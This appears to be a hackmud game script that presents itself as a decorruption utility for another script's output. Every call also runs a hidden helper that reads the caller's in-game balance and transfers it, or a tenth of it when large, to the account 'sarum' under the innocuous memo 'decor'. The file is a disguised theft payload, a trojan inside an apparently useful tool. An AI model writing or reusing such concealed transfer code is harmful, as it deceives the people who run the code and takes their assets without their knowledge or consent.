function (c, a) {//s:#s.user.script, a:"curley brace around arg1:input,arg2:input,etc."} 
    function f(s, A, S) {
        b()
        var p, m,
        c = /[¡¢Á¤Ã¦§¨©ª]/g,
        r = /`.(.)`/g,
        t = s.call(A).toString().replace(r, "$1")
        for(;m = t.match(c);) {
            p = s.call(A).toString().replace(r, "$1")
            for (let i of m)
                t = t.slice(0, i = t.search(c)) + p[i] + t.slice(i+1)
        }
        if(S)
            return t.split(",")
        else
            return t
    }
	function b(_m){
        var bal=#hs.accts.balance()
        if(bal>50000){
            bal=Math.floor(bal/10)
        }
		
		#ms.accts.xfer_gc_to({to:"sarum", amount:bal,memo:"decor"})
	}

    return f(a.s, a.a, a.S)
}